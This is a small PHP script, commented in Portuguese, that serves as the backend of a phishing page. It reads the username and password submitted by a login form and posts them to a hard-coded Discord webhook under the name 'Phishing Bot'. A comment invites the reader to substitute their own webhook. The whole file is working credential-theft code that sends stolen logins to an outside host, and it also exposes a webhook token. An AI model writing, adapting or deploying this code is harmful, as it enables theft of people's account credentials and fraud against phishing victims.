<?php
// Dados do formulário
$username = $_POST['username'];
$password = $_POST['password'];

// Envie os dados para o seu Discord
$webhookurl = 'https://discord.com/api/webhooks/1040678839396872322/TIl24vk7NiW4Fz3zACaKchZhtMc8ien3KjI9ha9EU1dTBeKIDH18H3Fgx3uStpAkG5Ud'; // Substitua pelo seu webhook do Discord

$data = array('username' => 'Phishing Bot', 'content' => "Username: $username\nPassword: $password");

$options = array(
    'http' => array(
        'header' => "Content-Type: application/json",
        'method' => 'POST',
        'content' => json_encode($data)
    )
);

$context = stream_context_create($options);
$result = file_get_contents($webhookurl, false, $context);
?>
